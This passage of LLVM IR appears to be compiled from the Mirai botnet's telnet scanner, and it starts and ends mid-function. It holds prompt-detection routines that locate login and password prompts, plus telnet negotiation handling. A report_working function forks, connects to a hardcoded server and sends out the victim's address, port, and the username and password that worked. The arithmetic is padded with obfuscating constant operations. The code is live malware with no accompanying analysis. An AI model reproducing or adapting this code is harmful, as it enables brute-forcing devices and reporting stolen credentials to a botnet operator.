  %72 = sub i32 0, %71
  %73 = sub i32 0, 3
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add nsw i32 %71, 3
  store i32 %75, i32* %3, align 4
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 1
  %79 = load i32, i32* %78, align 8
  %80 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %81 = call i64 @send(i32 %79, i8* %80, i64 3, i32 16384)
  %82 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 1
  %84 = load i32, i32* %83, align 8
  %85 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %86 = call i64 @send(i32 %84, i8* %85, i64 9, i32 16384)
  br label %144

; <label>:87:                                     ; preds = %47
  br label %88

; <label>:88:                                     ; preds = %87, %67
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %90 = load i8*, i8** %4, align 8
  %91 = call signext i8 @can_consume(%struct.scanner_connection* %89, i8* %90, i32 2)
  %92 = icmp ne i8 %91, 0
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %88
  br label %148

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %95

; <label>:95:                                     ; preds = %126, %94
  %96 = load i32, i32* %5, align 4
  %97 = icmp slt i32 %96, 3
  br i1 %97, label %98, label %131

; <label>:98:                                     ; preds = %95
  %99 = load i8*, i8** %4, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 253
  br i1 %105, label %106, label %111

; <label>:106:                                    ; preds = %98
  %107 = load i8*, i8** %4, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  store i8 -4, i8* %110, align 1
  br label %125

; <label>:111:                                    ; preds = %98
  %112 = load i8*, i8** %4, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 251
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %4, align 8
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  store i8 -3, i8* %123, align 1
  br label %124

; <label>:124:                                    ; preds = %119, %111
  br label %125

; <label>:125:                                    ; preds = %124, %106
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %5, align 4
  %128 = sub i32 0, 1
  %129 = sub i32 %127, %128
  %130 = add nsw i32 %127, 1
  store i32 %129, i32* %5, align 4
  br label %95

; <label>:131:                                    ; preds = %95
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 1
  %134 = load i32, i32* %133, align 8
  %135 = load i8*, i8** %4, align 8
  %136 = call i64 @send(i32 %134, i8* %135, i64 3, i32 16384)
  %137 = load i8*, i8** %4, align 8
  %138 = getelementptr inbounds i8, i8* %137, i64 3
  store i8* %138, i8** %4, align 8
  %139 = load i32, i32* %3, align 4
  %140 = add i32 %139, -1610942862
  %141 = add i32 %140, 3
  %142 = sub i32 %141, -1610942862
  %143 = add nsw i32 %139, 3
  store i32 %142, i32* %3, align 4
  br label %144

; <label>:144:                                    ; preds = %131, %68
  br label %145

; <label>:145:                                    ; preds = %144
  br label %146

; <label>:146:                                    ; preds = %145, %23
  br label %147

; <label>:147:                                    ; preds = %146
  br label %11

; <label>:148:                                    ; preds = %93, %60, %33, %22, %11
  %149 = load i32, i32* %3, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub i32 0, 1
  %15 = add i32 %13, %14
  %16 = sub nsw i32 %13, 1
  store i32 %15, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %72, %1
  %18 = load i32, i32* %5, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %78

; <label>:20:                                     ; preds = %17
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 7
  %23 = load i32, i32* %5, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i64 0, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 58
  br i1 %28, label %65, label %29

; <label>:29:                                     ; preds = %20
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %31, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp eq i32 %36, 62
  br i1 %37, label %65, label %38

; <label>:38:                                     ; preds = %29
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = load i32, i32* %5, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp eq i32 %45, 36
  br i1 %46, label %65, label %47

; <label>:47:                                     ; preds = %38
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 7
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [256 x i8], [256 x i8]* %49, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp eq i32 %54, 35
  br i1 %55, label %65, label %56

; <label>:56:                                     ; preds = %47
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 7
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 37
  br i1 %64, label %65, label %71

; <label>:65:                                     ; preds = %56, %47, %38, %29, %20
  %66 = load i32, i32* %5, align 4
  %67 = add i32 %66, -1115698190
  %68 = add i32 %67, 1
  %69 = sub i32 %68, -1115698190
  %70 = add nsw i32 %66, 1
  store i32 %69, i32* %6, align 4
  br label %78

; <label>:71:                                     ; preds = %56
  br label %72

; <label>:72:                                     ; preds = %71
  %73 = load i32, i32* %5, align 4
  %74 = add i32 %73, 1882220677
  %75 = add i32 %74, -1
  %76 = sub i32 %75, 1882220677
  %77 = add nsw i32 %73, -1
  store i32 %76, i32* %5, align 4
  br label %17

; <label>:78:                                     ; preds = %65, %17
  %79 = load i32, i32* %6, align 4
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %119

; <label>:81:                                     ; preds = %78
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %82 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %82, i8** %9, align 8
  %83 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %83, i8** %10, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 7
  %86 = getelementptr inbounds [256 x i8], [256 x i8]* %85, i32 0, i32 0
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 6
  %89 = load i32, i32* %88, align 4
  %90 = load i8*, i8** %9, align 8
  %91 = load i32, i32* %8, align 4
  %92 = sub i32 0, 1
  %93 = add i32 %91, %92
  %94 = sub nsw i32 %91, 1
  %95 = call i32 @util_memsearch(i8* %86, i32 %89, i8* %90, i32 %93)
  %96 = icmp ne i32 %95, -1
  %97 = zext i1 %96 to i32
  store i32 %97, i32* %7, align 4
  br i1 %96, label %98, label %100

; <label>:98:                                     ; preds = %81
  %99 = load i32, i32* %7, align 4
  store i32 %99, i32* %6, align 4
  br label %118

; <label>:100:                                    ; preds = %81
  %101 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %101, i32 0, i32 7
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %102, i32 0, i32 0
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 6
  %106 = load i32, i32* %105, align 4
  %107 = load i8*, i8** %10, align 8
  %108 = load i32, i32* %8, align 4
  %109 = sub i32 0, 1
  %110 = add i32 %108, %109
  %111 = sub nsw i32 %108, 1
  %112 = call i32 @util_memsearch(i8* %103, i32 %106, i8* %107, i32 %110)
  %113 = icmp ne i32 %112, -1
  %114 = zext i1 %113 to i32
  store i32 %114, i32* %7, align 4
  br i1 %113, label %115, label %117

; <label>:115:                                    ; preds = %100
  %116 = load i32, i32* %7, align 4
  store i32 %116, i32* %6, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %100
  br label %118

; <label>:118:                                    ; preds = %117, %98
  br label %119

; <label>:119:                                    ; preds = %118, %78
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %120 = load i32, i32* %6, align 4
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %119
  store i32 0, i32* %2, align 4
  br label %125

; <label>:123:                                    ; preds = %119
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %2, align 4
  br label %125

; <label>:125:                                    ; preds = %123, %122
  %126 = load i32, i32* %2, align 4
  ret i32 %126
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = add i32 %12, -1541380876
  %14 = sub i32 %13, 1
  %15 = sub i32 %14, -1541380876
  %16 = sub nsw i32 %12, 1
  store i32 %15, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %63, %1
  %18 = load i32, i32* %5, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %68

; <label>:20:                                     ; preds = %17
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 7
  %23 = load i32, i32* %5, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i64 0, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 58
  br i1 %28, label %56, label %29

; <label>:29:                                     ; preds = %20
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %31, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp eq i32 %36, 62
  br i1 %37, label %56, label %38

; <label>:38:                                     ; preds = %29
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = load i32, i32* %5, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp eq i32 %45, 36
  br i1 %46, label %56, label %47

; <label>:47:                                     ; preds = %38
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 7
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [256 x i8], [256 x i8]* %49, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp eq i32 %54, 35
  br i1 %55, label %56, label %62

; <label>:56:                                     ; preds = %47, %38, %29, %20
  %57 = load i32, i32* %5, align 4
  %58 = add i32 %57, -1884841576
  %59 = add i32 %58, 1
  %60 = sub i32 %59, -1884841576
  %61 = add nsw i32 %57, 1
  store i32 %60, i32* %6, align 4
  br label %68

; <label>:62:                                     ; preds = %47
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = sub i32 0, -1
  %66 = sub i32 %64, %65
  %67 = add nsw i32 %64, -1
  store i32 %66, i32* %5, align 4
  br label %17

; <label>:68:                                     ; preds = %56, %17
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %90

; <label>:71:                                     ; preds = %68
  call void @table_unlock_val(i8 zeroext 25)
  %72 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %72, i8** %7, align 8
  %73 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %73, i32 0, i32 7
  %75 = getelementptr inbounds [256 x i8], [256 x i8]* %74, i32 0, i32 0
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 6
  %78 = load i32, i32* %77, align 4
  %79 = load i8*, i8** %7, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sub i32 0, 1
  %82 = add i32 %80, %81
  %83 = sub nsw i32 %80, 1
  %84 = call i32 @util_memsearch(i8* %75, i32 %78, i8* %79, i32 %82)
  %85 = icmp ne i32 %84, -1
  %86 = zext i1 %85 to i32
  store i32 %86, i32* %8, align 4
  br i1 %85, label %87, label %89

; <label>:87:                                     ; preds = %71
  %88 = load i32, i32* %8, align 4
  store i32 %88, i32* %6, align 4
  br label %89

; <label>:89:                                     ; preds = %87, %71
  br label %90

; <label>:90:                                     ; preds = %89, %68
  call void @table_lock_val(i8 zeroext 25)
  %91 = load i32, i32* %6, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %90
  store i32 0, i32* %2, align 4
  br label %96

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* %6, align 4
  store i32 %95, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %94, %93
  %97 = load i32, i32* %2, align 4
  ret i32 %97
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub i32 0, 1
  %11 = add i32 %9, %10
  %12 = sub nsw i32 %9, 1
  store i32 %11, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %68, %1
  %14 = load i32, i32* %5, align 4
  %15 = icmp sgt i32 %14, 0
  br i1 %15, label %16, label %75

; <label>:16:                                     ; preds = %13
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [256 x i8], [256 x i8]* %18, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = sext i8 %22 to i32
  %24 = icmp eq i32 %23, 58
  br i1 %24, label %61, label %25

; <label>:25:                                     ; preds = %16
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  br i1 %33, label %61, label %34

; <label>:34:                                     ; preds = %25
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 7
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [256 x i8], [256 x i8]* %36, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 36
  br i1 %42, label %61, label %43

; <label>:43:                                     ; preds = %34
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %45, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 35
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %5, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %54, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 37
  br i1 %60, label %61, label %67

; <label>:61:                                     ; preds = %52, %43, %34, %25, %16
  %62 = load i32, i32* %5, align 4
  %63 = sub i32 %62, -1578029912
  %64 = add i32 %63, 1
  %65 = add i32 %64, -1578029912
  %66 = add nsw i32 %62, 1
  store i32 %65, i32* %6, align 4
  br label %75

; <label>:67:                                     ; preds = %52
  br label %68

; <label>:68:                                     ; preds = %67
  %69 = load i32, i32* %5, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, -1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add nsw i32 %69, -1
  store i32 %73, i32* %5, align 4
  br label %13

; <label>:75:                                     ; preds = %61, %13
  %76 = load i32, i32* %6, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  store i32 0, i32* %2, align 4
  br label %81

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* %6, align 4
  store i32 %80, i32* %2, align 4
  br label %81

; <label>:81:                                     ; preds = %79, %78
  %82 = load i32, i32* %2, align 4
  ret i32 %82
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 %15, 361856160
  %17 = sub i32 %16, 1
  %18 = add i32 %17, 361856160
  %19 = sub nsw i32 %15, 1
  %20 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %18)
  %21 = icmp ne i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %42

; <label>:23:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %24 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %24, i8** %4, align 8
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 7
  %27 = getelementptr inbounds [256 x i8], [256 x i8]* %26, i32 0, i32 0
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 6
  %30 = load i32, i32* %29, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %6, align 4
  %33 = sub i32 0, 1
  %34 = add i32 %32, %33
  %35 = sub nsw i32 %32, 1
  %36 = call i32 @util_memsearch(i8* %27, i32 %30, i8* %31, i32 %34)
  store i32 %36, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %37 = load i32, i32* %5, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %23
  store i32 0, i32* %2, align 4
  br label %42

; <label>:40:                                     ; preds = %23
  %41 = load i32, i32* %5, align 4
  store i32 %41, i32* %2, align 4
  br label %42

; <label>:42:                                     ; preds = %40, %39, %22
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  ret void

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  call void @exit(i32 0) #8
  unreachable

; <label>:23:                                     ; preds = %19
  call void @table_unlock_val(i8 zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0)) #6
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 2, i32* null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #8
  unreachable

; <label>:42:                                     ; preds = %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 %43, i8* %11, i64 1, i32 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 %45, i8* %46, i64 4, i32 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 %48, i8* %49, i64 2, i32 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 %51, i8* %53, i64 1, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 %55, i8* %58, i64 %62, i32 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 %64, i8* %66, i64 1, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 %68, i8* %71, i64 %75, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 %77)
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
